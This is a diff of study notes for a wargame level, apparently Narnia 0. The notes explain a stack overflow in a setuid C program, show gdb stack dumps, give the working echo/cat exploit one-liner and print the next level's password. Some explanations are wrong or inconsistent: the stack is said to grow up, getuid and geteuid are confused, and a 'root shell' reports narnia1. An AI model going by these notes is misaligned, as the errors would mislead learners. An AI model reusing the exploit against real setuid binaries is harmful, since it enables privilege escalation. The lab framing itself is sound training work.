@@ -293,18 +293,18 @@ Output :
 #include <unistd.h>
 
 int main(){
-    long val=0x41414141;        // 
-    char buf[20];               // 
+    long val=0x41414141;        // 32-bit int hexadecimal "AAAA"
+    char buf[20];               // 20-byte character array on stack
 
     printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
     printf("Here is your chance: ");
-    scanf("%24s",&buf);                 // user input
+    scanf("%24s",&buf);                 // user input, 24-bytes
 
     printf("buf: %s\n",buf);
-    printf("val: 0x%08x\n",val);
+    printf("val: 0x%08x\n",val);    // print the overflow in val
 
-    if(val==0xdeadbeef){
-        setreuid(geteuid(),geteuid());
+    if(val==0xdeadbeef){                // if sucessfully overflowed
+        setreuid(geteuid(),geteuid());  // sets euid and reuid to root
         system("/bin/sh");
     }
     else {
@@ -314,22 +314,46 @@ int main(){
 
     return 0;
 }
-
 ```
-
-Now it is time to refresh your knowledge about C and the stack...
-Try to find out what happens in the source code.
-
-### Q4.1 - What happens?
-
-
-
-
-### Q4.2 - Look for the vulnerability.
-
-### Q4.3 - Draw a stack diagram for the program.
+Notes :
+- RUID (Real UID), EUID (Effective UID), SUID (Saved UID)
+- ex. Alice runs `sudo`. The process has RUID=Alice and EUID=root.
+- `getuid()` returns the euid in the current context (RUID in normal binary, returns 0-root in a setuid-root binary).
+- `setreuid(RUID, EUID)` is an atomic way of setting at the same time RUID and EUID.
+- but only root can call it OR if SUID=root (bc binary is setuid-root) 
 
 
+
+### Q4.1 - What happens? Q4.2 - Look for the vulnerability.
+Vulnerability - buffer overflow :
+1. Declare val with "AAAA". This is the value we need to overflow.
+2. Declare a 20-byte array in the stack (right next to val). Stack grows up !
+3. scanf() prompts the user and reads up to 24 bytes into a 20-byte buffer, so a 24-byte input overflows by 4 bytes exactly into val.
+4. Sending 20 bytes of filler + `\xef\xbe\xad\xde` (little-endian for 0xdeadbeef) makes val == 0xdeadbeef.
+5. If done right we can write into `val` the 0xdeadbeef string, if we suceed
+
+
+Vulnerability - privilege escalation : 
+Completely separate from the prev vulnerability.
+1. Binary is called with setuid root.  This makes the kernel launch it with RUID = caller (e.g., 1000), EUID = 0, SUID = 0.
+2. Normally setuid functions do EUID=RUID after startup, this exploit doesn't. So EUID stays root (0).
+3. `setreuid(0, 0)` normalizes RUID also to 0. This is allowed because SUID=0.
+4. Without this normalization, `system("/bin/sh")` would spawn a shell with RUID=1000, EUID=0; the shell detects the mismatch and drops EUID back to 1000, giving the attacker only a user shell.
+5. With normalization, the shell inherits RUID=EUID=0 → root shell.
+
+
+```bash
+setreuid(geteuid(),geteuid());
+- geteuid() = 0, root. # since the binary runs as temporary root with SUID !
+-  setreuid(0, 0)   # give ourselves full root IDs
+```
+- Important to have both EUID and RUID equal, the `system("/bin/sh")` will check which user (RUID) launches a shell, we want a root shell, not user shell.
+
+
+
+Notes :
+- even worse, scanf is unbounded by default, `scanf("%s",buf);` could send like 10MB and stack memory.
+- Every setuid-root exploit from 2000 to 2010 ended with `setreuid(geteuid(), geteuid()); system("/bin/sh");`.
 
 
 
@@ -340,10 +364,38 @@ Use gdb to get information about the stack. Useful commands:
 - info proc mappings: A way to see the memory regions mapped by a process.
 - x/20x $esp: prints 20 units at address $esp in hex using the default unit size (word; usually 4 bytes on x86). So you’ll see 20 words (4-byte values) in hex.
 
-### Q4.4 - Show me the commands
+#### GDB - General Debugger
+GDB is a debugger. It runs the program one machine instruction at a time, lets us stop it at any point, and lets us inspect everything — registers, memory, stack, variables — as if the program were frozen in time.
 
 
-So we need to find a way to overwrite the value on the stack next to buf with the value 0xdeadbeef.
+### Q4.4 - Use gdb to inspect the stack while running the exploit
+```bash
+# Open the debugger
+narnia0@narnia:~$ gdb /narnia/narnia0 
+
+# Start : load prg in memory, set tmp breakpoint (program is now frozen !)
+(gdb) start
+
+# Step forward - next instruction (ni) runs one machine instruction each time
+(gdb) ni
+
+ni
+ni
+ni
+ni
+# ... 12x in total
+# enter 'BBBBBBBBBBBBBBBBBBBABCD' (20x 'B')
+x/20x $esp # esp = Extended Stack Pointer
+(gdb) x/20x $esp
+0xffffd364: 0x0804a051  0xffffd36c  0x42424242  0x42424242
+0xffffd374: 0x42424242  0x42424242  0x42424242  0x44434241
+0xffffd384: 0xf7fade00  0x00000000  0xf7da1cb9  0x00000001
+0xffffd394: 0xffffd444  0xffffd44c  0xffffd3b0  0xf7fade34
+0xffffd3a4: 0x080490dd  0x00000001  0xffffd444  0xf7fade34
+quit
+
+```
+So we need to find a way to **overwrite the value on the stack next to buf with the value 0xdeadbeef**.
 We can see in the previous debug screen that we are able to overwrite the value on the stack next to buf, which is val.
 
 We could use python to do this or printf, but we can also use the echo command:
@@ -353,15 +405,52 @@ The command echo -e will encode the hexadecimal values in the string.
 Using the pipe symbol | sends the output of the echo command to the input of the next program.
 (echo -e "Hello World")|myprogram
 
+```bash
+# 1. val must be 20-byte filler + 0xdeadbeef in little endian ()
+echo -e 'xxxxxxxxxxxxxxxxxxxx\xef\xbe\xad\xde'   # -e tells to interpret backslash
+# \xef\xbe\xad\xde becomes 4 raw bytes: 0xEF, 0xBE, 0xAD, 0xDE.
 
-### Q4.5 - Try to write this command yourself to get the correct value.
+# 2. Subshell, run cat after echo, without it, echo runs, opens the shell, but closes the pipe
+(echo -e 'xxxxxxxxxxxxxxxxxxxx\xef\xbe\xad\xde'; cat)
+# this maintains the function running. Cat will read anything we write in the terminal, and write it to stdout (shell)
+
+# 3. Pipe - feeds the output to a specific file.
+(echo -e 'xxxxxxxxxxxxxxxxxxxx\xef\xbe\xad\xde'; cat) | ./narnia0
+```
+
+Running the xploit :
+
+```bash
+# Pipe the output of this print into the exe
+narnia0@narnia:/narnia$ (echo -e 'xxxxxxxxxxxxxxxxxxxx\xef\xbe\xad\xde'; cat) | ./narnia0
+Correct val\'s value from 0x41414141 -> 0xdeadbeef!
+Here is your chance: buf: xxxxxxxxxxxxxxxxxxxxﾭ�
+val: 0xdeadbeef
+
+# This outputs a blinking underscore, the function is still running, but opened a root shell !
+_
+
+# Now we can try to run commands :
+whoami
+narnia1
+```
+-> Exploit worked, we are logged in as narnia1 using privilege escalation !
 
 
-As you can see, the program immediately stops.
-We need to use cat to keep the program running. (echo -e "Hello World";cat)|myprogram will keep on waiting for input. Next you see the cursor blinking.
+
 ---
 
 ## 5. The exploit works!
+We have entered the /bin/sh program!
+```bash
+# Test which user we are.
+whoami
+narnia1
+
+# Read the password for narnia1, unlocking the next step of the tutorial
+cat /etc/narnia_pass/narnia1
+O8dJypubLr
+```
 
 
 
